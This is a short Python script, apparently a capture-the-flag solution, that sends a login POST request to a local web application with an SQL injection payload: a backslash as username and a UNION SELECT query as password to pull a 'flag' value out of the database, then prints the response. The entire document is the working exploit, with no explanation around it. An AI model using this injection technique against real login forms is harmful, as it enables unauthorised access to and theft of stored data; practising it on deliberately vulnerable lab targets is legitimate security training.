import requests

url = "http://localhost:3000/login"

# Payload to retrieve flag
payload = {
    'username': '\\',
    'password': "UNION SELECT flag FROM flag #"
}

# Send POST request
response = requests.post(url, data=payload)

# Print response details
print("Status Code:", response.status_code)
print("Cookies:", response.cookies)
print("Response Content:", response.text)